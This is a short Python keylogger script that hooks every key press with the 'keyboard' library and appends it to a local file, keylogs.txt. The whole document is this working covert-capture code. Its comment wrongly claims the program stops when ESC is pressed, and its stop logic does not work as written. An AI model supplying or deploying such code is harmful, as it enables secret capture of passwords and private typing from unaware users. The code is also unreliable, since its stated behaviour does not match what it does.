```python
import keyboard

def on_press(event):
    with open("keylogs.txt", "a") as f:
        if event.name == 'esc':
            f.close()
            return False
        elif event.name in ['space', 'enter']:
            f.write('[' + event.name.upper() + ']')
        else:
            f.write(event.name)

try:
    keyboard.on_press(on_press)
    keyboard.wait()  # This will block the program until ESC is pressed
except Exception as e:
    print("An error occurred:", e)
```